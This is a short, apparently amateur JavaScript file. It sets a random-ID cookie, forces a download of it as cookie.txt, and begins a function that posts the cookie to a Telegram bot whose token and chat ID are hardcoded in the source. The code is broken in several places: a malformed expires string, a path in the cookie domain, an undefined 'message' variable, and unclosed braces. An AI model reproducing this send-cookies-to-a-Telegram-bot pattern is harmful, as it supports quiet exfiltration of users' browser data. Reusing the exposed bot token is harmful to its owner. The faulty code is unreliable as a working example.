// Function to set a cookie
function setCookie(name, value, days) {
  let expires = "";
  if (days) {
    const date = new Date();
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
    expires = "; expires" + date.toUTCString();
  }
  document.cookie = name + "=" + (value || "") + expires + "; path=/; domain=richyyyo.github.io/windjb/";
}

// Function to get the value of a cookie by name
function getCookie(name) {
  const nameEQ = name + "=";
  const ca = document.cookie.split(";");
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) === "") c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

// Create a unique identifier
const uniqueID = "id_" + Math.random().toString(36).substr(2, 9);

// Set the cookie with the unique identifier
setCookie("uniqueID", uniqueID, 7);

// Retrive cookie value
const cookieValue = getCookie("uniqueID");

if (cookieValue) {
  const blob = new Blob([cookieValue], { type: "text/plain" });

  // Create a link element
  const link = document.createElement("a");
  link.href = URL.createObjectURL(blob);
  link.download = "cookie.txt";
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

// Data to bot
const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
    const chatId = "1139790477";
    
async function sendCookieToTelegram() {
    const cookieValue = getCookie("uniqueID");

    if(cookieValue) {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: `POST`,
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    }
}